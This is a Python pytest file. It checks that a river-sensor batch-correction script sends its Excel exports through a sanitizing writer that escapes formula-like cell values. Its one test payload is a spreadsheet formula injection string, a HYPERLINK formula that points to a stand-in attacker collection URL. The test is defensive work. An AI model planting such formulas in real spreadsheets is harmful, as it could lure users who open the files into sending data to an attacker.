"""Routing tests for batch correction spreadsheet safety integration."""

import pandas as pd  # type: ignore
import pytest  # type: ignore

from scripts.batch_correction import BatchConfig, batch_process


@pytest.mark.usefixtures("mock_config_loader")
def test_batch_process_routes_through_write_excel_safely(
    mock_dependencies, mocker
):
    """The batch processor must route Excel exports through write_excel_safely
    and the sanitizer must escape formula-like payloads before to_excel is called.
    """
    payload = '=HYPERLINK("http://attacker.example/collect","click")'

    def read_csv_side_effect(path, *args, **kwargs):
        if str(path).endswith("river_mile_map.csv"):
            return pd.DataFrame({"SENSOR_ID": [26], "RIVER_MILE": [54.0]})
        return pd.DataFrame(
            {
                0: [1, 2, 3],
                1: [10.0, 20.0, 30.0],
                2: [payload, "safe", "safe"],
            }
        )

    mocker.patch("pandas.read_csv", side_effect=read_csv_side_effect)
    mock_dependencies["listdir"].return_value = ["S26_Y01.txt"]
    mock_dependencies["isfile"].return_value = True

    summary_df = batch_process(
        BatchConfig(
            series_selection=26,
            river_miles=None,
            years=(1995, 1995),
            dry_run=False,
        )
    )

    assert len(summary_df) == 1
    mock_write_excel = mock_dependencies["write_excel_safely"]
    assert mock_write_excel.called

    written_path = mock_write_excel.call_args.args[1]
    assert written_path.endswith("Year_1995 (Y01)_Data.xlsx")
    assert mock_write_excel.call_args.kwargs == {"index": False, "header": False}
    df_passed = mock_write_excel.call_args.args[0]
    assert df_passed.iloc[0, 2] == payload
